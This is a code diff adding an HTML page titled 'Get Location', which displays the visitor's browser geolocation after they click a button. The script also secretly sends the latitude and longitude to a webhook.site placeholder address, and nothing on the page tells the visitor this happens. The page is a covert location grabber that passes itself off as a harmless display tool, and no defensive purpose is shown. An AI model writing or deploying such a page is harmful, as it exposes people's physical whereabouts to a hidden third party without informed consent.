@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Get Location</title>
+</head>
+<body>
+  <button onclick="getLocation()">Get Location</button>
+  <p id="demo"></p>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+function sendWebhook(latitude, longitude) {
+      var webhookUrl = 'https://webhook.site/YOUR_WEBHOOK_URL';
+      var data = {
+        latitude: latitude,
+        longitude: longitude
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Webhook sent successfully!');
+        } else {
+          console.error('Failed to send webhook.');
+        }
+      })
+      .catch(error => {
+        console.error('Error sending webhook:', error);
+      });
+    }
+
+    function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+      document.getElementById("demo").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
+      sendWebhook(latitude, longitude);
+    }
+  </script>
+</body>
+</html>
